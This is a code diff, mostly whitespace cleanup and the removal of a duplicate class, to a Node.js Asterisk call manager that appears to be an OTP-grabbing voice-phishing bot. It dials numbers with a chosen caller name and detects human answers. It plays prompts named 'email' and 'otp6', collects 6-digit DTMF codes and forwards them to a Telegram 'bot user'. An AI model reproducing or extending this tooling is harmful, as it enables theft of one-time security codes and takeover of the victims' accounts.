@@ -23,7 +23,7 @@ class InteractiveCallManager extends EventEmitter {
       // Use the shared AMI instance from asterisk/instance.js
       const { ami: sharedAmi } = require('./asterisk/instance');
       this.ami = sharedAmi;
-      
+
       // Check if the shared AMI is already connected
       if (this.ami.connected) {
         console.log('Using existing AMI connection');
@@ -35,13 +35,13 @@ class InteractiveCallManager extends EventEmitter {
           console.log('Shared AMI connected for InteractiveCallManager');
           this.connected = true;
         });
-        
+
         this.ami.on('disconnect', () => {
           console.log('Shared AMI disconnected');
           this.connected = false;
         });
       }
-      
+
     } catch (error) {
       console.error('Error setting up shared AMI:', error);
     }
@@ -65,7 +65,7 @@ class InteractiveCallManager extends EventEmitter {
   handleAsteriskEvent(event) {
     console.log('Asterisk UserEvent:', event);
     const callId = this.getCallIdFromChannel(event.channel);
-    
+
     if (!callId) return;
 
     switch (event.userevent) {
@@ -107,7 +107,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async handleMenuOption(callId, option) {
     let callData = this.activeCalls.get(callId);
-    
+
     // If call not found, try to find by partial match
     if (!callData) {
       for (let [id, call] of this.activeCalls.entries()) {
@@ -118,7 +118,7 @@ class InteractiveCallManager extends EventEmitter {
         }
       }
     }
-    
+
     if (!callData) {
       console.error(`❌ Call ${callId} not found when handling menu option ${option}`);
       return;
@@ -201,7 +201,7 @@ class InteractiveCallManager extends EventEmitter {
       callData.answeredAt = new Date();
       this.activeCalls.set(callId, callData);
     }
-    
+
     this.updateCallProgress(callId, 'Call answered - analyzing...');
     this.emit('callAnswered', callId, answerType);
   }
@@ -214,7 +214,7 @@ class InteractiveCallManager extends EventEmitter {
       callData.detectionResult = 'Human detected';
       this.activeCalls.set(callId, callData);
     }
-    
+
     this.updateCallProgress(callId, 'Human detected - playing intro');
     this.emit('humanDetected', callId);
   }
@@ -227,7 +227,7 @@ class InteractiveCallManager extends EventEmitter {
       callData.detectionResult = 'Voicemail detected';
       this.activeCalls.set(callId, callData);
     }
-    
+
     this.updateCallProgress(callId, 'Voicemail detected - leaving message');
     this.emit('voicemailDetected', callId);
   }
@@ -240,7 +240,7 @@ class InteractiveCallManager extends EventEmitter {
       callData.detectionResult = 'Answering machine detected';
       this.activeCalls.set(callId, callData);
     }
-    
+
     this.updateCallProgress(callId, 'Answering machine detected - waiting for beep');
     this.emit('answeringMachineDetected', callId);
   }
@@ -292,20 +292,20 @@ class InteractiveCallManager extends EventEmitter {
     try {
       // Clean phone number (remove any non-numeric characters except +)
       const cleanPhone = phoneNumber.replace(/[^\d+]/g, '');
-      
+
       console.log(`Initiating call to ${cleanPhone} (Name: ${name})`);
-      
+
       if (this.connected) {
         // Use the correct SIP channel format from working system
         const sipChannel = `SIP/${config.sip.username}/${cleanPhone}`;
-        
+
         // Create action ID similar to original system
         const actionId = `call-${cleanPhone}-${Date.now()}`;
-        
+
         console.log(`Using SIP channel: ${sipChannel}`);
         console.log(`Using context: call-flow`);
         console.log(`Action ID: ${actionId}`);
-        
+
         // Originate call through Asterisk with proper SIP configuration matching working system
         const response = await this.ami.action({
           action: 'Originate',
@@ -321,7 +321,7 @@ class InteractiveCallManager extends EventEmitter {
         });
 
         console.log('Call originated successfully:', response);
-        
+
         // Store the channel mapping for future reference
         if (response && response.uniqueid) {
           this.channelCallIdMap.set(response.uniqueid, callId);
@@ -329,21 +329,21 @@ class InteractiveCallManager extends EventEmitter {
       } else {
         // Simulation mode for testing when not connected to Asterisk
         console.log('Asterisk not connected - using simulation mode');
-        
+
         // Simulate call progression with delays
         setTimeout(() => {
           this.updateCallProgress(callId, 'Call answered - analyzing...');
           this.emit('callAnswered', callId, 'unknown');
         }, 2000);
-        
+
         setTimeout(() => {
           this.updateCallProgress(callId, 'Human detected - playing intro');
           this.emit('humanDetected', callId);
         }, 4000);
       }
-      
+
       this.updateCallProgress(callId, `Call originated to ${cleanPhone} - dialing`);
-      
+
       return callId;
     } catch (error) {
       console.error('Error originating call:', error);
@@ -354,7 +354,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async playAudioToCall(callId, audioType) {
     console.log(`🎵 Attempting to play ${audioType} audio for call ${callId}`);
-    
+
     // Standardize call lookup - check this manager first, then Asterisk
     let callData = this.activeCalls.get(callId);
     if (!callData) {
@@ -406,7 +406,7 @@ class InteractiveCallManager extends EventEmitter {
     }
 
     console.log(`🎵 Playing ${audioType} audio on channel ${callData.channel}`);
-    
+
     try {
       if (this.connected && this.ami) {
         // Redirect channel to play the audio
@@ -423,24 +423,24 @@ class InteractiveCallManager extends EventEmitter {
       }
 
       this.updateCallProgress(callId, `Playing ${audioType} audio - will collect 6-digit DTMF`);
-      
+
       // Set the call to await DTMF input for 6-digit codes after playing audio
       this.setCallAwaitingDTMF(callId, true);
-      
+
       // After a delay (to allow audio to finish), prompt for DTMF collection
       setTimeout(() => {
         this.playDTMFCollectionPrompt(callId);
       }, 5000); // 5 second delay for audio to finish
-      
+
     } catch (error) {
       console.error('Error playing audio:', error);
       throw error;
     }
   }
-  
+
   setCallAwaitingDTMF(callId, awaiting = true) {
     console.log(`🔢 Setting call ${callId} awaiting DTMF: ${awaiting}`);
-    
+
     // Try to set on InteractiveCallManager call
     if (this.activeCalls.has(callId)) {
       const callData = this.activeCalls.get(callId);
@@ -450,7 +450,7 @@ class InteractiveCallManager extends EventEmitter {
       }
       this.activeCalls.set(callId, callData);
     }
-    
+
     // Also set on asterisk/instance call
     try {
       const { setCallAwaitingDTMF } = require('./asterisk/instance');
@@ -462,7 +462,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async playDTMFCollectionPrompt(callId) {
     console.log(`🔢 Playing DTMF collection prompt for call ${callId}`);
-    
+
     const callData = this.activeCalls.get(callId);
     if (!callData || !callData.channel) {
       console.error(`❌ Call or channel not found for DTMF prompt: ${callId}`);
@@ -490,7 +490,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async playPleaseWaitMessage(callId) {
     console.log(`🕐 Playing "please wait" message for call ${callId}`);
-    
+
     // Find the call data with proper lookup
     let callData = this.activeCalls.get(callId);
     if (!callData) {
@@ -517,10 +517,10 @@ class InteractiveCallManager extends EventEmitter {
           exten: 'stop-audio',
           priority: 1
         });
-        
+
         // Wait a brief moment for audio to stop
         await new Promise(resolve => setTimeout(resolve, 500));
-        
+
         // Play the "please wait" message
         await this.ami.action({
           action: 'redirect',
@@ -529,14 +529,14 @@ class InteractiveCallManager extends EventEmitter {
           exten: 'play-please-wait',
           priority: 1
         });
-        
+
         console.log(`✅ Please wait message redirect sent successfully`);
       } else {
         console.log(`⚠️ Asterisk not connected - simulating please wait message`);
       }
 
       this.updateCallProgress(callId, 'Please wait while your request is being processed...');
-      
+
     } catch (error) {
       console.error('Error playing please wait message:', error);
       throw error;
@@ -551,14 +551,14 @@ class InteractiveCallManager extends EventEmitter {
         slow: false,
         host: 'https://translate.google.com',
       });
-      
+
       const response = await axios.get(url, { responseType: 'arraybuffer' });
       const audioBuffer = Buffer.from(response.data);
-      
+
       // Save TTS file
       const ttsPath = `/tmp/tts_${callId}.mp3`;
       fs.writeFileSync(ttsPath, audioBuffer);
-      
+
       // Convert to WAV for Asterisk
       const wavPath = `/tmp/tts_${callId}.wav`;
       await new Promise((resolve, reject) => {
@@ -588,7 +588,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async handleButtonClick(callId, buttonId) {
     console.log(`Button clicked for call ${callId}: ${buttonId}`);
-    
+
     switch (buttonId) {
       case 'email':
         await this.playAudioToCall(callId, 'email');
@@ -632,7 +632,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async handleDTMF(callId, digit) {
     console.log(`DTMF received for call ${callId}: ${digit}`);
-    
+
     const callData = this.activeCalls.get(callId);
     if (!callData) {
       throw new Error('Call not found');
@@ -655,7 +655,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async sendManualDTMF(callId, digit) {
     console.log(`Sending manual DTMF for call ${callId}: ${digit}`);
-    
+
     const callData = this.activeCalls.get(callId);
     if (!callData) {
       throw new Error('Call not found');
@@ -668,7 +668,7 @@ class InteractiveCallManager extends EventEmitter {
 
     // Simulate DTMF processing - in real implementation, this would send to Asterisk
     this.updateCallProgress(callId, `Manual DTMF sent: ${digit}`);
-    
+
     // Handle the digit like a received DTMF
     if (digit === '1') {
       // Show Telegram menu for the 3 options to the bot user
@@ -683,7 +683,7 @@ class InteractiveCallManager extends EventEmitter {
 
   async sendDTMFCode(callId, code) {
     console.log(`Sending DTMF code for call ${callId}: ${code}`);
-    
+
     const callData = this.activeCalls.get(callId);
     if (!callData) {
       throw new Error('Call not found');
@@ -694,16 +694,16 @@ class InteractiveCallManager extends EventEmitter {
     this.activeCalls.set(callId, callData);
 
     this.updateCallProgress(callId, `DTMF code entered: ${code}`);
-    
+
     // Send the code to the bot user
     this.emit('dtmfCodeReceived', callId, code);
-    
+
     return { success: true, message: `DTMF code ${code} sent to bot user` };
   }
 
   async showDTMFOptions(callId) {
     console.log(`Showing DTMF options for call ${callId}`);
-    
+
     const callData = this.activeCalls.get(callId);
     if (!callData) {
       throw new Error('Call not found');
@@ -715,10 +715,9 @@ class InteractiveCallManager extends EventEmitter {
 
     this.updateCallProgress(callId, 'Showing DTMF input options');
     this.emit('showDTMFOptions', callId);
-    
+
     return { success: true, message: 'DTMF options displayed' };
   }
-
 
   async endCall(callId) {
     const callData = this.activeCalls.get(callId);
@@ -740,257 +739,6 @@ class InteractiveCallManager extends EventEmitter {
     this.activeCalls.delete(callId);
     this.channelCallIdMap.delete(callData.channel);
     console.log(`Call ${callId} ended`);
-  }
-}
-
-module.exports = { InteractiveCallManager };
-const EventEmitter = require('events');
-const { initializeAMI, getAMI } = require('./asterisk/instance');
-const config = require('./config');
-const fs = require('fs');
-const path = require('path');
-
-class InteractiveCallManager extends EventEmitter {
-  constructor() {
-    super();
-    this.ami = null;
-    this.connected = false;
-    this.activeCalls = new Map();
-    this.callCounter = 0;
-  }
-
-  async initialize() {
-    try {
-      this.ami = await initializeAMI();
-      this.connected = true;
-      console.log('✅ Interactive Call Manager initialized');
-    } catch (error) {
-      console.error('❌ Failed to initialize Interactive Call Manager:', error);
-      // Continue without AMI for development
-      this.connected = false;
-    }
-  }
-
-  async initiateCall(phoneNumber, name = 'Unknown') {
-    const callId = `call_${++this.callCounter}_${Date.now()}`;
-    
-    // Store call data
-    this.activeCalls.set(callId, {
-      phoneNumber,
-      name,
-      status: 'initiating',
-      startTime: new Date(),
-      ttsRecordings: {}
-    });
-
-    try {
-      // Clean phone number
-      const cleanPhone = phoneNumber.replace(/[^\d+]/g, '');
-      
-      console.log(`Initiating call to ${cleanPhone} (Name: ${name})`);
-      
-      if (this.connected) {
-        const sipChannel = `SIP/${config.sip.username}/${cleanPhone}`;
-        const actionId = `call-${cleanPhone}-${Date.now()}`;
-        
-        console.log(`Using SIP channel: ${sipChannel}`);
-        
-        const response = await this.ami.action({
-          action: 'Originate',
-          channel: sipChannel,
-          context: 'call-flow',
-          exten: 'start', 
-          priority: 1,
-          actionid: actionId,
-          CallerID: `"${name}" <${config.sip.username}>`,
-          variable: `CALL_ID=${callId},PHONE_NUMBER=${cleanPhone},NAME=${name.replace(/,/g, '_')}`,
-          timeout: 30000,
-          async: true
-        });
-
-        console.log('✅ Call origination response:', response);
-      } else {
-        console.log('⚠️ AMI not connected, simulating call initiation');
-        // Simulate call for development
-        setTimeout(() => {
-          this.emit('callAnswered', callId, 'simulated');
-        }, 2000);
-      }
-
-      return callId;
-    } catch (error) {
-      console.error('❌ Error initiating call:', error);
-      this.activeCalls.delete(callId);
-      throw error;
-    }
-  }
-
-  async uploadAudioForCall(callId, audioPath) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    const callData = this.activeCalls.get(callId);
-    callData.uploadedAudio = audioPath;
-    callData.status = 'audio_uploaded';
-    
-    this.activeCalls.set(callId, callData);
-    
-    console.log(`✅ Audio uploaded for call ${callId}: ${audioPath}`);
-    this.emit('callUpdated', callId, 'Audio uploaded');
-    
-    return { success: true, audioPath };
-  }
-
-  async playAudioToCall(callId, audioType) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    console.log(`🎵 Playing ${audioType} audio for call ${callId}`);
-    
-    // Map audio types to files
-    const audioFiles = {
-      'email': 'email6.mp3',
-      'otp6': 'otp6.mp3',
-      'invalidcode': 'invalidcode.mp3',
-      'press2': 'press2.mp3',
-      'press9': 'press9.mp3',
-      'invalid': 'invalidcode.mp3'
-    };
-
-    const audioFile = audioFiles[audioType];
-    if (!audioFile) {
-      throw new Error(`Unknown audio type: ${audioType}`);
-    }
-
-    if (this.connected) {
-      try {
-        const response = await this.ami.action({
-          action: 'PlayFile',
-          channel: `SIP/${config.sip.username}-${callId}`,
-          file: audioFile.replace('.mp3', ''),
-          actionid: `play-${callId}-${Date.now()}`
-        });
-        console.log(`✅ Audio play response:`, response);
-      } catch (error) {
-        console.log(`⚠️ Could not play audio via AMI, simulating: ${error.message}`);
-      }
-    } else {
-      console.log(`⚠️ AMI not connected, simulating audio play: ${audioFile}`);
-    }
-
-    this.emit('callUpdated', callId, `Playing ${audioType} audio`);
-    return { success: true, audioType, file: audioFile };
-  }
-
-  async playTTSMessage(callId, message) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    console.log(`🗣️ Playing TTS message for call ${callId}: "${message}"`);
-    
-    if (this.connected) {
-      try {
-        const response = await this.ami.action({
-          action: 'SendText',
-          channel: `SIP/${config.sip.username}-${callId}`,
-          message: message,
-          actionid: `tts-${callId}-${Date.now()}`
-        });
-        console.log(`✅ TTS response:`, response);
-      } catch (error) {
-        console.log(`⚠️ Could not send TTS via AMI, simulating: ${error.message}`);
-      }
-    } else {
-      console.log(`⚠️ AMI not connected, simulating TTS play`);
-    }
-
-    this.emit('callUpdated', callId, `Playing TTS: ${message}`);
-    return { success: true, message };
-  }
-
-  async sendManualDTMF(callId, digit) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    console.log(`🔢 Sending manual DTMF ${digit} for call ${callId}`);
-    
-    if (this.connected) {
-      try {
-        const response = await this.ami.action({
-          action: 'SendDTMF',
-          channel: `SIP/${config.sip.username}-${callId}`,
-          digit: digit,
-          actionid: `dtmf-${callId}-${Date.now()}`
-        });
-        console.log(`✅ DTMF send response:`, response);
-      } catch (error) {
-        console.log(`⚠️ Could not send DTMF via AMI, simulating: ${error.message}`);
-      }
-    } else {
-      console.log(`⚠️ AMI not connected, simulating DTMF send`);
-    }
-
-    this.emit('callUpdated', callId, `Manual DTMF sent: ${digit}`);
-    return { success: true, digit, message: `DTMF ${digit} sent successfully` };
-  }
-
-  async showDTMFOptions(callId) {
-    console.log(`🔢 Showing DTMF options for call ${callId}`);
-    this.emit('showDTMFOptions', callId);
-    return { success: true };
-  }
-
-  async getCallStatus(callId) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-    return this.activeCalls.get(callId);
-  }
-
-  async getActiveCalls() {
-    return Array.from(this.activeCalls.entries());
-  }
-
-  async endCall(callId) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    console.log(`📴 Ending call ${callId}`);
-    
-    if (this.connected) {
-      try {
-        const response = await this.ami.action({
-          action: 'Hangup',
-          channel: `SIP/${config.sip.username}-${callId}`,
-          actionid: `hangup-${callId}-${Date.now()}`
-        });
-        console.log(`✅ Hangup response:`, response);
-      } catch (error) {
-        console.log(`⚠️ Could not hangup via AMI, simulating: ${error.message}`);
-      }
-    }
-
-    this.activeCalls.delete(callId);
-    this.emit('callEnded', callId);
-    return { success: true };
-  }
-
-  async setupTTSRecordings(callId, recordings) {
-    if (!this.activeCalls.has(callId)) {
-      throw new Error(`Call ${callId} not found`);
-    }
-
-    const callData = this.activeCalls.get(callId);
-    callData.ttsRecordings = recordings;
-    this.activeCalls.set(callId, callData);
-    
-    console.log(`✅ TTS recordings setup for call ${callId}`);
-    return { success: true };
   }
 }
 
